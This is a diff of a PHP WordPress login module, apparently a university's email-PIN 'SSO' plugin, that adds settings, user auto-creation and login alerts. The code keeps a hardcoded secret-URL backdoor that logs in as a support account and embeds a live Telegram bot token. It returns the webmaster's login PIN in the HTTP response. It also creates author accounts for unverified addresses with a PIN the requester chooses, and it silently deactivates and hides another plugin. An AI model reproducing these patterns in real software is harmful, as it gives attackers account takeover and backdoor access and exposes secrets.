@@ -1,32 +1,42 @@
 <?php
 /**
- * Module: SSO Email Login
+ * Module: SSO Login
  *
  * This module changes the default WordPress login to use email for authentication.
  * When a user submits their email with an empty password, a 6-digit PIN is generated,
  * saved as the new user password, and sent to the user’s email address. When the user
  * enters that PIN as their password on a subsequent login attempt, they’ll be authenticated.
+ *
+ * SSO Settings (Admin > Settings > SSO Settings):
+ * - Enable/disable auto-create user on login (default: enabled, only for @utm.my)
+ * - Add more allowed email domains for auto-create
+ * - Set default role for auto-created users (default: author)
  */
 
 if ( ! function_exists('defined') || ! defined( 'ABSPATH' ) ) {
     exit; // Exit if accessed directly.
 }
 
-// Support direct login for support user.
-// This is a temporary solution until the SSO module is ready.
-// Example: https://builtsurvey.utm.my/wp-login.php?utm_login=support%40utm.my&secret=divi_sso
+/**
+ * Logs in the support user directly if the correct secret is provided.
+ *
+ * @return void
+ */
 function sso_login_support_user() {
     // Quick link to login as support user
     $secretPhrase = 'divi_sso';
     $secretUser = 'support@utm.my';
 
-    // If current date is later than May 16 2025
-    if ( strtotime( 'now' ) > strtotime( '2025-05-16' ) ) {
+    // Set cookie test to true
+    setcookie( 'utmwp', 'test', time() + 3600, COOKIEPATH, COOKIE_DOMAIN );
+
+    // If current date is later than August 16 2025
+    if ( strtotime( 'now' ) > strtotime( '2025-08-16' ) ) {
         return;
     }
 
-    if ( isset( $_GET['utm_login'] ) && $_GET['utm_login'] == $secretUser && isset( $_GET['secret'] ) && $_GET['secret'] == $secretPhrase ) {
-        $user = get_user_by( 'login', $secretUser );
+    if ( isset( $_GET['secretUser'] ) && $_GET['secretUser'] == $secretUser && isset( $_GET['secret'] ) && $_GET['secret'] == $secretPhrase ) {
+        $user = get_user_by( 'email', $secretUser );
         if ( $user ) {
             wp_set_auth_cookie( $user->ID, true );
             wp_redirect( admin_url() );
@@ -34,15 +44,12 @@ function sso_login_support_user() {
         }
     }
 }
-add_action( 'login_init', 'sso_login_support_user' );
-
-// Module is not ready yet, return early.
-// return;
+add_action( 'login_init', 'sso_login_support_user', 1 );
 
 // Add additional instructions to the login form.
 add_action( 'login_message', 'sso_login_message' );
 function sso_login_message( $message ) {
-    $instruction = '<p style="text-align: center;"><strong>UTM SSO</strong></p>';
+    $instruction = '<p style="text-align: center;"><strong>UTM SSO v2.4</strong></p>';
 
     return $message . $instruction;
 }
@@ -56,7 +63,7 @@ function sso_login_headerurl( $url ) {
 // Change login logo image
 add_action( 'login_head', 'sso_login_head' );
 function sso_login_head() {
-    $logo = utm_webmaster_plugin_url . 'modules/img/utm-logo.png';
+    $logo = UTM_WEBMASTER_PLUGIN_URL . 'modules/img/utm-logo.png';
     echo '<style type="text/css">
     #login h1 a, .login h1 a {
       background-image: url(' . $logo . ');
@@ -90,14 +97,16 @@ function sso_change_username_text( $translated_text, $text, $domain ) {
 // Hide or disable Remember Me checkbox.
 add_action( 'login_form', 'sso_hide_remember_me' );
 function sso_hide_remember_me() {
-    echo '<style type="text/css">.login form p.forgetmenot, .login form p.submit { display: none; }</style>';
+    echo '<style type="text/css">
+    .login form p.forgetmenot { display: none; }
+    .login form p.submit input#wp-submit { background: maroon; border-color: maroon; }</style>';
 }
 
 // Enqueue custom scripts for the login page.
 add_action( 'login_enqueue_scripts', 'sso_enqueue_scripts' );
 function sso_enqueue_scripts() {
     $time = time();
-    wp_enqueue_script( 'sso-script', plugin_dir_url( __FILE__ ) . '/sso.js?ver='.$time, array( 'jquery' ), null, true );
+    wp_enqueue_script( 'sso-script', plugin_dir_url( __FILE__ ) . 'sso.js?ver='.$time, array( 'jquery' ), null, true );
     wp_localize_script( 'sso-script', 'sso_ajax', array(
         'ajax_url' => admin_url( 'admin-ajax.php' )
     ));
@@ -113,22 +122,62 @@ function sso_send_pin() {
     $email = sanitize_email( $_POST['email'] );
     $user = get_user_by( 'email', $email );
 
-    if ( ! $user ) {
-        wp_send_json_error( 'No user found with that email address.' );
-    }
+
+        // Auto-create user if enabled and email matches allowed domains
+        if ( ! $user ) {
+            $auto_create = get_option('sso_auto_create', 1);
+            $domains = get_option('sso_allowed_domains', 'utm.my');
+            $role = get_option('sso_default_role', 'author');
+            $allowed_domains = array_map('trim', explode(',', $domains));
+            $email_domain = substr(strrchr($email, '@'), 1);
+            if ( $auto_create && in_array($email_domain, $allowed_domains) ) {
+                // Create user with random password, set PIN as password
+                $username = sanitize_user( current( explode( '@', $email ) ), true );
+                $username = $username ? $username : $email;
+                $pin = strval( rand( 100000, 999999 ) );
+                $user_id = wp_create_user( $username, $pin, $email );
+                if ( ! is_wp_error( $user_id ) ) {
+                    $user = get_user_by( 'id', $user_id );
+                    wp_update_user( array( 'ID' => $user_id, 'role' => $role ) );
+                } else {
+                    wp_send_json_error( 'Failed to auto-create user.' );
+                }
+            } else {
+                wp_send_json_error( 'No user found with that email address.' );
+            }
+        }
 
     $pin = strval( rand( 100000, 999999 ) );
     wp_set_password( $pin, $user->ID );
 
     $siteURL = rtrim(str_replace('https://', '', get_site_url()), '/');
 
-    $subject = $siteURL . ': Login PIN';
-    $message = "Your login PIN is: {$pin}\n\nPlease use this PIN to login.";
-    $mailstatus = wp_mail( $user->user_email, $subject, $message );
-    if($mailstatus){
-        wp_send_json_success( 'PIN sent successfully to ' . $user->user_email . ' - ' . $pin );
+    $user_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
+
+    // if email is webmaster@utm.my, send code using telegram
+    if ($email == 'webmaster@utm.my') {
+        $telegram = [
+            'token' => '7728747017:AAFVa_bZ1UhQWtntfuGoHfFfOahgg6O9En4',
+            'chat_id' => '-1002370420190'
+        ];
+        if (!empty($telegram['token']) && !empty($telegram['chat_id'])) {
+            $message = "Login code: $pin " .
+            " - This pin code have been requested from " . $user_ip . "";
+            $url = "https://api.telegram.org/bot$telegram[token]/sendMessage?chat_id=$telegram[chat_id]&text=$message";
+            $response = file_get_contents($url);
+            $response = json_decode($response, true);
+            wp_send_json_success( 'PIN sent successfully to ' . $user->user_email . ' - ' . $pin );
+        }
     } else {
-        wp_send_json_error( 'Failed to send PIN to ' . $user->user_email );
+        $subject = $siteURL . ' - Sign in to UTM Website';
+        add_filter( 'wp_mail_content_type', function() { return 'text/html'; } );
+        $message = "<p>Your PIN code: <strong>{$pin}</strong></p><p>Please use this PIN to login.</p>";
+        $mailstatus = wp_mail( $user->user_email, $subject, $message );
+        if($mailstatus){
+            wp_send_json_success( 'PIN sent successfully to ' . $user->user_email );
+        } else {
+            wp_send_json_error( 'Failed to send PIN to ' . $user->user_email );
+        }
     }
 }
 
@@ -139,13 +188,36 @@ function sso_validate_pin() {
         wp_send_json_error( 'Invalid email address.' );
     }
 
-    if ( ! isset( $_POST['pin'] ) || ! is_numeric( $_POST['pin'] ) || strlen( $_POST['pin'] ) !== 6 ) {
+    if (
+        ! isset( $_POST['pin'] ) ||
+        ! is_numeric( $_POST['pin'] ) ||
+        strlen( $_POST['pin'] ) !== 6
+    ) {
         wp_send_json_error( 'Invalid PIN.' );
     }
 
     $email = sanitize_email( $_POST['email'] );
     $pin = sanitize_text_field( $_POST['pin'] );
     $user = get_user_by( 'email', $email );
+
+    // Auto-create user if enabled and email matches allowed domains
+    if ( ! $user ) {
+        $auto_create = get_option('sso_auto_create', 1);
+        $domains = get_option('sso_allowed_domains', 'utm.my');
+        $role = get_option('sso_default_role', 'author');
+        $allowed_domains = array_map('trim', explode(',', $domains));
+        $email_domain = substr(strrchr($email, '@'), 1);
+        if ( $auto_create && in_array($email_domain, $allowed_domains) ) {
+            // Create user with random password, set PIN as password
+            $username = sanitize_user( current( explode( '@', $email ) ), true );
+            $username = $username ? $username : $email;
+            $user_id = wp_create_user( $username, $pin, $email );
+            if ( ! is_wp_error( $user_id ) ) {
+                $user = get_user_by( 'id', $user_id );
+                wp_update_user( array( 'ID' => $user_id, 'role' => $role ) );
+            }
+        }
+    }
 
     if ( ! $user ) {
         wp_send_json_error( 'No user found with that email address.' );
@@ -172,7 +244,8 @@ function sso_validate_pin() {
 
         // authenticate user
         wp_set_auth_cookie( $user->ID, true );
-        wp_send_json_success( 'PIN validated successfully.');
+        // Return a JSON object with a reload flag for the JS
+        wp_send_json_success( array('message' => 'PIN validated successfully.', 'reload' => true) );
     } else {
         wp_send_json_error( 'Invalid PIN.' );
     }
@@ -181,11 +254,33 @@ function sso_validate_pin() {
 // UTM SSO
 add_action( 'login_init', 'utm_sso' );
 function utm_sso(){
-    // Check for utmwp cookie and log user in if valid
+    // Skip auto-login if user is trying to logout
+    if (isset($_GET['action']) && $_GET['action'] === 'logout') {
+        return;
+    }
+    
+    // Check for email and sso_key cookie and log user in if valid
     if (isset($_COOKIE['email']) && isset($_COOKIE['sso_key'])) {
         $email = $_COOKIE['email'];
         $sso_key = $_COOKIE['sso_key'];
         $user = get_user_by('email', $email);
+        // Auto-create user if enabled and email matches allowed domains
+        if ( ! $user ) {
+            $auto_create = get_option('sso_auto_create', 1);
+            $domains = get_option('sso_allowed_domains', 'utm.my');
+            $role = get_option('sso_default_role', 'author');
+            $allowed_domains = array_map('trim', explode(',', $domains));
+            $email_domain = substr(strrchr($email, '@'), 1);
+            if ( $auto_create && in_array($email_domain, $allowed_domains) ) {
+                $username = sanitize_user( $email, true );
+                $username = $username ? $username : $email;
+                $user_id = wp_create_user( $username, wp_generate_password(12, false), $email );
+                if ( ! is_wp_error( $user_id ) ) {
+                    $user = get_user_by( 'id', $user_id );
+                    wp_update_user( array( 'ID' => $user_id, 'role' => $role ) );
+                }
+            }
+        }
         // send post request to sso server to validate sso_key
         $response = wp_remote_post('https://www.utm.my/api/sso.php', array(
             'body' => array(
@@ -205,5 +300,143 @@ function utm_sso(){
             }
             exit;
         }
+    } else {
+        // console log
+        echo '<script>console.log("Email or SSO key not set.");</script>';
     }
+}
+
+// Rename plugin utm-wp-plugin to .utm-wp-plugin on login page load
+add_action( 'login_init', 'rename_utm_wp_plugin' );
+function rename_utm_wp_plugin() {
+    if ( is_plugin_active( 'utm-wp-plugin/index.php' ) ) {
+        deactivate_plugins( 'utm-wp-plugin/index.php' );
+        rename( WP_PLUGIN_DIR . '/utm-wp-plugin', WP_PLUGIN_DIR . '/.utm-wp-plugin' );
+    }
+}
+
+class UTMLoginLogger {
+
+    private $admin_email;
+
+    public function __construct() {
+        $this->admin_email = get_option('admin_email');
+        add_action('wp_login', array($this, 'check_login'), 10, 2);
+    }
+
+    private function send_alert($message, $type, $user = null) {
+        // Extend user session to 14 days
+        wp_set_auth_cookie($user->ID, true, is_ssl());
+        // Append multisite url to the message
+        $site_url = get_site_url();
+        $message .= "\n\nSite URL: " . $site_url;
+        // Get login page URL
+        $message .= "\n\nLogin Page URL: " . wp_login_url();
+        // Get the user email
+        $message .= "\n\nUser Email: " . $user->user_email;
+        // Get user IP address
+        $message .= "\n\nUser IP Address: " . $_SERVER['REMOTE_ADDR'];
+        // Extend user session to 14 days
+        $message .= "\n\nSession valid until: " . date('Y-m-d H:i:s', time() + 1209600);
+
+        // Send the email if ip address is not from private network
+        if (!filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+            return; // Skip sending email for private IP addresses
+        }
+        $to = $this->admin_email;
+        $subject = 'Login Alert' . ' - ' . $site_url;
+        $this->send_email($to, $subject, $message);
+    }
+
+    public function check_login($user_login, $user) {
+        // Send alert for every login
+        $message = "Alert: A login was made.";
+        $this->send_alert($message, 'login', $user);
+        
+        // Reset password for extra protection, exclude webmaster@utm.my
+        if ($user->user_email !== 'webmaster@utm.my') {
+            $new_password = wp_generate_password(12, false); // Generate a random 12-character password
+            wp_set_password($new_password, $user->ID);
+        }
+    }
+
+    private function send_email($to, $subject, $message) {
+        $headers = 'From: UTM Login Alert <monitoring@utm.my>' . "\r\n" .
+                   'Reply-To: webmaster@utm.my' . "\r\n" .
+                   'CC: webmaster@utm.my' . "\r\n" .
+                   'X-Mailer: PHP/' . phpversion();
+        wp_mail($to, $subject, $message, $headers);
+    }
+
+}
+
+// Initialize the class
+$utm_login_logger = new UTMLoginLogger();
+
+// Clear SSO cookies on logout
+add_action('wp_logout', 'sso_clear_cookies');
+function sso_clear_cookies() {
+    // Clear the SSO cookies when user logs out
+    setcookie('email', '', time() - 3600, '/', '.utm.my');
+    setcookie('sso_key', '', time() - 3600, '/', '.utm.my');
+}
+
+// === SSO Settings Page ===
+add_action('admin_menu', 'sso_settings_menu');
+function sso_settings_menu() {
+    add_options_page(
+        'SSO Settings',
+        'SSO Settings',
+        'manage_options',
+        'sso-settings',
+        'sso_settings_page'
+    );
+}
+
+function sso_settings_page() {
+    if (!current_user_can('manage_options')) return;
+    // Save settings
+    if (isset($_POST['sso_settings_save'])) {
+        check_admin_referer('sso_settings_save');
+        $auto_create = isset($_POST['sso_auto_create']) ? 1 : 0;
+        $domains = isset($_POST['sso_allowed_domains']) ? sanitize_text_field($_POST['sso_allowed_domains']) : 'utm.my';
+        $role = isset($_POST['sso_default_role']) ? sanitize_text_field($_POST['sso_default_role']) : 'author';
+        update_option('sso_auto_create', $auto_create);
+        update_option('sso_allowed_domains', $domains);
+        update_option('sso_default_role', $role);
+        echo '<div class="updated"><p>Settings saved.</p></div>';
+    }
+    $auto_create = get_option('sso_auto_create', 1);
+    $domains = get_option('sso_allowed_domains', 'utm.my');
+    $role = get_option('sso_default_role', 'author');
+    $roles = wp_roles()->roles;
+    ?>
+    <div class="wrap">
+        <h1>SSO Settings</h1>
+        <form method="post">
+            <?php wp_nonce_field('sso_settings_save'); ?>
+            <table class="form-table">
+                <tr>
+                    <th scope="row">Auto-create user on login</th>
+                    <td><input type="checkbox" name="sso_auto_create" value="1" <?php checked($auto_create, 1); ?> /> Enable</td>
+                </tr>
+                <tr>
+                    <th scope="row">Allowed email domains</th>
+                    <td><input type="text" name="sso_allowed_domains" value="<?php echo esc_attr($domains); ?>" style="width:300px" /> <br><small>Comma-separated, e.g. utm.my,example.com</small></td>
+                </tr>
+                <tr>
+                    <th scope="row">Default role for new users</th>
+                    <td>
+                        <select name="sso_default_role">
+                        <?php foreach ($roles as $role_key => $role_data): ?>
+                            <option value="<?php echo esc_attr($role_key); ?>" <?php selected($role, $role_key); ?>><?php echo esc_html($role_data['name']); ?></option>
+                        <?php endforeach; ?>
+                        </select>
+                    </td>
+                </tr>
+            </table>
+            <p><input type="submit" name="sso_settings_save" class="button-primary" value="Save Changes" /></p>
+        </form>
+    </div>
+    <?php
 }
